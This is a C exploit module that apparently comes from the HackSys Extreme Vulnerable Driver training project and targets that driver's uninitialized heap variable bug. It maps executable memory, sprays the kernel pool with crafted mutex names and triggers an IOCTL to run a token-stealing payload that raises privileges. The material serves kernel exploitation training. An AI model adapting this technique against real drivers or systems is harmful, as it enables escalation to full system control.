/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]payatu[dot]com
Website: http://www.payatu.com/

Copyright (C) 2011-2016 Payatu Technologies Pvt. Ltd. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedHeapVariable.c

Abstract:
    This module implements the exploit for Uninitialized
    Heap Variable Vulnerability implemented in HackSys
    Extreme Vulnerable Driver.

--*/

#include "UninitializedHeapVariable.h"
#define PAGE_ALLOC 0x400
#define MUTEX_NAME_LEN 120


DWORD WINAPI UninitializedHeapVariableThread(LPVOID Parameter) {
    /*CONST PTCHAR Message =
        "\t                                                            \t\n"
        "\t            + - + - + - + - + - + - + - + - + - +           \t\n"
        "\t            | C | H | A | L | L | E | N | G | E |           \t\n"
        "\t            + - + - + - + - + - + - + - + - + - +           \t\n"
        "\t                                                            \t\n"
        "\t  Write the exploit for use of Uninitialized Heap Variable  \t\n"
        "\t                                                            \t\n"
        "\t                          Need Help?                        \t\n"
        "\t                                                            \t\n"
        "\t                   ashfaq[at]payatu[dot]com                 \t\n"
        "\t                                                            \t\n";

        DEBUG_ERROR(Message);

    return EXIT_FAILURE;*/
	int i,j,m;
	ULONG BytesReturned;
    HMODULE hNtDll = NULL;
	PVOID VM_Address = NULL;
	ULONG Address = 0;
	ULONG CallResult = 0;
    PVOID EopPayload = &TokenStealingPayloadWin7Generic;
	SIZE_T RegionSize = 0x1000;
	HANDLE hFile = NULL;

	char aMutexName[MUTEX_NAME_LEN]; 
	HANDLE hMutex[PAGE_ALLOC];
	LPCSTR FileName = (LPCSTR)DEVICE_NAME;
	ULONG MagicValue = 0xBAADF00D;

	__try{
	DEBUG_INFO("\t[+] Resolving Kernel APIs\n");//Get Kernel API just like NtAllocVirtualMemory and CreateMutex
	
	hNtDll = LoadLibrary("ntdll.dll");//Load ntdll.dll

	if(!hNtDll)//if load failure
	{
		DEBUG_ERROR("\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
	}

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");//get NtAllocateVirtualMemory

	if (!NtAllocateVirtualMemory) {
        DEBUG_ERROR("\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t[+] NtAllocateVirtualMemory: 0x%p\n", NtAllocateVirtualMemory);
    }

	DEBUG_INFO("\t[+] Alloc Memory\n");

			//Address = ('a'+rand()%26<<16)+'a'+rand()%26;
			Address = 0x00460046;
			VM_Address = (PVOID)Address;
			CallResult = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
				&VM_Address,
				0,
				&RegionSize,
				MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
       		     	    	PAGE_EXECUTE_READWRITE);			

			if (CallResult==0){ 
				DEBUG_INFO("\t\t[+] Allocated memory at VM_Address 0x%p\n", VM_Address);	
			}
			else
			{
				DEBUG_ERROR("\t\t[-] Create Mutex failed: error 0x%X\n", GetLastError());
				exit(EXIT_FAILURE);
			}
	DEBUG_INFO("\t[+] Kernel Heap Spray\n");
    DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);


	*(PBYTE)Address = 0x68;
	*(PULONG)(Address+1) = (ULONG)EopPayload;
	*(PBYTE)(Address+5) = 0xc3;

	for (j=0; j<PAGE_ALLOC; j++)
	{
		aMutexName[0] = 0x46;
		aMutexName[1] = 0x46;
		aMutexName[2] = 0x46;
		aMutexName[3] = 0x46;
		for (m=4; m<MUTEX_NAME_LEN; m++)
			aMutexName[m] = 'a' + rand()%26;
		aMutexName[MUTEX_NAME_LEN-1] = '\0';
		hMutex[j] = CreateMutex(NULL, TRUE, aMutexName);
		if (!hMutex[j])
		{
			DEBUG_ERROR("\t\t[-] Create Mutex failed: error 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}

	DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
    DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

    hFile = GetDeviceHandle(FileName);
	DEBUG_MESSAGE("\t[+] Triggering Use of Uninitialized Heap Variable\n");

    OutputDebugString("****************Kernel Mode****************\n");



        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE,
                        (LPVOID)&MagicValue,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");
		for (j=0; j<PAGE_ALLOC; j++)
			CloseHandle(hMutex[j]);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
